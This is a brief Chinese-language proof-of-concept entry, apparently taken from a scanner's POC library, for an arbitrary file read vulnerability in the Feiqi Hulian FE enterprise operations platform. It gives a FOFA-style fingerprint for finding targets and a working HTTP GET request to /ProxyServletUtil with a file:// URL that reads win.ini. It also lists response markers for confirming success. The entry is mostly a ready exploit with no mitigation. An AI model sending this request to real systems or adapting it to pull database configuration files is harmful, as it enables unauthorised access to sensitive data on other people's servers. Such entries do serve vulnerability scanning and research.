﻿# 飞企互联-FE企业运营管理平台ProxyServletUti 任意文件读取漏洞

> 更新时间：2024-04-30

> 漏洞编号：

> 漏洞说明：飞企互联FE业务协作平台ProxyServletUi接口存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件、数据库配置文件等等，导致网站处于极度不安全状态。

> 漏洞特征：app="飞企互联-FE企业运营管理平台"

> 验证脚本：HTTP

```
GET /ProxyServletUtil?url=file:///c:/Windows/win.ini HTTP/1.1

```

> 响应代码特征：200

> 响应内容特征：support

> 上传文件定位：

> 验证文件来源：飞企互联-FE企业运营管理平台ProxyServletUti 任意文件读取漏洞.poc

